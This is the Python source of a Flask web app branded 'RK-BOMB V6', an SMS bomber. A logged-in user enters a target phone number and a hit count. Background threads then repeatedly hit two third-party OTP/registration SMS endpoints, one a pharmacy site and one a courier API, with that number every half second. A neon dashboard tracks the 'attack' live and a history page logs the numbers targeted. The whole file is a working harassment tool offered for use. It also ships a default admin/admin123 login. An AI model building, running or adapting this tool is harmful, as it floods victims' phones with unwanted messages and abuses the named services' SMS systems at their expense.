import requests
import threading
import os
import time
import sqlite3
import random
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ---------- DATABASE SETUP ----------
def get_db():
    conn = sqlite3.connect('rk_v6_cyber.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, phone TEXT, 
            success INTEGER, fail INTEGER, total INTEGER, limit_amt INTEGER, 
            status TEXT, start_time TEXT, stop_time TEXT, duration TEXT, 
            date_str TEXT, timestamp DATETIME)''')
        conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT UNIQUE, password TEXT, status TEXT)")
        try:
            conn.execute("INSERT INTO users VALUES (?, ?, ?)", ("admin", generate_password_hash("admin123"), "active"))
        except: pass

init_db()

# ---------- HIGH SPEED BOMBING ENGINE ----------
active_sessions = {}

def bombing_task(username, phone, limit, start_dt):
    key = f"{username}_{phone}"
    # Multiple APIs for stability
    api_list = [
        "https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={}",
        "https://redx.com.bd/api/v1/user/otp?phone={}"
    ]

    while key in active_sessions:
        curr = active_sessions[key]
        if curr['total'] >= curr['limit'] or curr['status'] == 'Stopped': break
        
        if curr['status'] == 'Running':
            try:
                # High Speed Request (Reduced timeout & sleep)
                res = requests.get(random.choice(api_list).format(phone), timeout=5)
                if res.status_code == 200:
                    active_sessions[key]['success'] += 1
                    active_sessions[key]['new_hit'] = True
                else:
                    active_sessions[key]['fail'] += 1
            except:
                active_sessions[key]['fail'] += 1
            
            active_sessions[key]['total'] += 1
            time.sleep(0.5) # Turbo Speed
        else:
            time.sleep(1)

    stop_dt = datetime.now()
    duration = str(stop_dt - start_dt).split('.')[0]
    s = active_sessions.get(key)
    if s:
        with get_db() as conn:
            conn.execute('''INSERT INTO history 
                (username, phone, success, fail, total, limit_amt, status, start_time, stop_time, duration, date_str, timestamp) 
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?)''',
                (username, phone, s['success'], s['fail'], s['total'], s['limit'], "Completed", 
                 s['start_time'], stop_dt.strftime("%I:%M %p"), duration, start_dt.strftime("%d/%m/%Y"), start_dt))
        del active_sessions[key]

# ---------- ADVANCED CYBER UI ----------
LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK-BOMB V6 CYBER-FRAME</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00ffcc; --bg: #020202; --panel: #0a0a0f; --red: #ff003c; --blue: #00d2ff; }
        body { background: var(--bg); color: #fff; font-family: 'Rajdhani', sans-serif; margin: 0; overflow-x: hidden; }

        /* Rotating Border Frame Animation */
        @keyframes rotateBorder { 100% { filter: hue-rotate(360deg); } }
        
        .nav { background: #000; padding: 15px 25px; border-bottom: 2px solid var(--neon); display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:1000; }
        .logo { font-family: 'Orbitron'; font-weight: 700; color: var(--neon); text-shadow: 0 0 15px var(--neon); }

        .container { padding: 20px; max-width: 600px; margin: auto; }

        /* FIXED MONITOR FRAME */
        .monitor-frame {
            position: relative;
            background: #000;
            border-radius: 15px;
            padding: 3px; /* Space for animated border */
            overflow: hidden;
            margin-bottom: 20px;
        }

        /* Animated Border Logic */
        .monitor-frame::before {
            content: '';
            position: absolute;
            width: 200%; height: 200%;
            background: conic-gradient(transparent, transparent, transparent, var(--neon));
            top: -50%; left: -50%;
            animation: rotate 4s linear infinite;
        }
        @keyframes rotate { 100% { transform: rotate(360deg); } }

        .monitor-content {
            position: relative;
            background: var(--panel);
            border-radius: 12px;
            padding: 20px;
            z-index: 1;
        }

        input { 
            width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #222; 
            color: var(--neon); border-radius: 8px; box-sizing: border-box; outline: none; 
            font-family: 'Orbitron'; font-size: 12px;
        }

        .fire-btn { 
            background: var(--neon); color: #000; border: none; padding: 15px; width: 100%; 
            border-radius: 8px; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; 
            box-shadow: 0 0 10px var(--neon); transition: 0.3s;
        }

        /* LIVE ATTACK BOX - FIXED HEIGHT & STABLE */
        #live-engine {
            min-height: 200px;
            max-height: 500px;
            overflow-y: auto;
            padding: 10px 0;
        }

        .attack-card {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid #1a1a1a;
            border-left: 4px solid var(--blue);
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 8px;
            position: relative;
        }

        .prog-bg { background: #111; height: 6px; border-radius: 3px; margin: 10px 0; overflow: hidden; }
        .prog-bar { background: linear-gradient(90deg, var(--blue), var(--neon)); height: 100%; width: 0%; transition: 0.4s; }

        .stat-line { display: flex; justify-content: space-between; font-size: 13px; font-family: 'Orbitron'; }
        .badge { font-size: 10px; padding: 2px 8px; border-radius: 4px; font-weight: bold; text-transform: uppercase; }
        .bg-run { background: rgba(0, 210, 255, 0.2); color: var(--blue); border: 1px solid var(--blue); }

        .nav-links a { color: #fff; text-decoration: none; margin-left: 15px; font-size: 13px; font-weight: bold; }
    </style>
</head>
<body>
    <audio id="snd_hit" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

    <nav class="nav">
        <div class="logo">RK-BOMB <span style="color:#fff">V6</span></div>
        <div class="nav-links">
            <a href="/dashboard">DASHBOARD</a>
            <a href="/history">LOGS</a>
            <a href="/logout" style="color:var(--red)">EXIT</a>
        </div>
    </nav>

    <div class="container">
        <div class="monitor-frame">
            <div class="monitor-content">
                <h3 style="margin-top:0; color:var(--neon); font-family:'Orbitron';">🛰 COMMAND CENTER</h3>
                <form action="/api/start">
                    <input name="num" placeholder="TARGET NUMBER" required>
                    <input name="amt" type="number" placeholder="MAX HIT LIMIT" required>
                    <button class="fire-btn">EXECUTE SQUADRON</button>
                </form>
            </div>
        </div>

        <div id="live-engine"></div>
    </div>

    <script>
        function playSnd(id) { let s = document.getElementById(id); if(s){ s.currentTime=0; s.play().catch(e=>{}); } }
        
        function updateStatus() {
            fetch('/api/status').then(r=>r.json()).then(data=>{
                let area = document.getElementById('live-engine');
                let html = '';
                for(let k in data){
                    let s = data[k];
                    if(s.new_hit) playSnd('snd_hit');
                    let p = (s.total/s.limit)*100;
                    html += `
                    <div class="attack-card">
                        <div class="stat-line">
                            <span style="color:var(--neon)">📱 ${s.phone}</span>
                            <span class="badge bg-run">${s.status}</span>
                        </div>
                        <div class="prog-bg"><div class="prog-bar" style="width:${p}%"></div></div>
                        <div class="stat-line" style="font-size:11px;">
                            <span>✅ OK: ${s.success}</span>
                            <span>❌ FAIL: ${s.fail}</span>
                            <span>📊 ${s.total}/${s.limit}</span>
                        </div>
                        <div style="margin-top:10px; display:flex; gap:10px;">
                            <button onclick="location.href='/api/control?num=${s.phone}&action=${s.status==='Running'?'Paused':'Running'}'" style="flex:1; background:var(--blue); border:none; border-radius:4px; font-weight:bold; cursor:pointer; font-size:10px; padding:5px;">PAUSE/RESUME</button>
                            <button onclick="location.href='/api/stop?num=${s.phone}'" style="flex:1; background:var(--red); color:white; border:none; border-radius:4px; font-weight:bold; cursor:pointer; font-size:10px; padding:5px;">STOP</button>
                        </div>
                    </div>`;
                }
                // Only update if data changed to prevent flickering
                if(area.innerHTML !== html) area.innerHTML = html;
            });
        }
        setInterval(updateStatus, 1500);
    </script>
</body>
</html>
'''

# ---------- ROUTES & LOGIC ----------
@app.route('/')
def root(): return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        with get_db() as conn:
            user = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
        if user and check_password_hash(user['password'], p):
            session['user'] = u
            return redirect(url_for('dashboard'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '')) # Simplified for the prompt

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(LAYOUT)

@app.route('/history')
def history():
    if 'user' not in session: return redirect(url_for('login'))
    with get_db() as conn:
        logs = conn.execute("SELECT * FROM history ORDER BY id DESC LIMIT 15").fetchall()
    
    html = '<h3 style="font-family:Orbitron; color:var(--blue);">📜 MISSION ARCHIVE</h3>'
    for l in logs:
        html += f'''
        <div class="attack-card" style="border-left: 4px solid #333;">
            <div class="stat-line"><b>{l['phone']}</b> <small>{l['date_str']}</small></div>
            <div style="font-size:12px; color:#aaa; margin-top:5px;">Hits: {l['success']} | Duration: {l['duration']}</div>
        </div>'''
    return render_template_string(LAYOUT.replace('<form action="/api/start">', '').replace('🛰 COMMAND CENTER', 'MISSION ARCHIVE').replace('<input name="num" placeholder="TARGET NUMBER" required>', html).replace('<input name="amt" type="number" placeholder="MAX HIT LIMIT" required>', '').replace('<button class="fire-btn">EXECUTE SQUADRON</button>', '<button class="fire-btn" onclick="location.href=\'/dashboard\'">BACK TO DASHBOARD</button>'))

@app.route('/api/start')
def api_start():
    u, num, amt = session.get('user'), request.args.get('num'), request.args.get('amt')
    if u and num and amt:
        now = datetime.now()
        active_sessions[f"{u}_{num}"] = {
            'phone': num, 'success': 0, 'fail': 0, 'total': 0, 'limit': int(amt), 
            'status': 'Running', 'start_time': now.strftime("%I:%M %p"), 'new_hit': False
        }
        threading.Thread(target=bombing_task, args=(u, num, int(amt), now), daemon=True).start()
    return redirect(url_for('dashboard'))

@app.route('/api/status')
def api_status():
    u = session.get('user', '')
    data = {k: v for k, v in active_sessions.items() if k.startswith(u)}
    res = jsonify(data)
    for k in data: active_sessions[k]['new_hit'] = False
    return res

@app.route('/api/control')
def api_control():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = request.args.get('action')
    return redirect(url_for('dashboard'))

@app.route('/api/stop')
def api_stop():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = 'Stopped'
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout(): session.clear(); return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=54321)
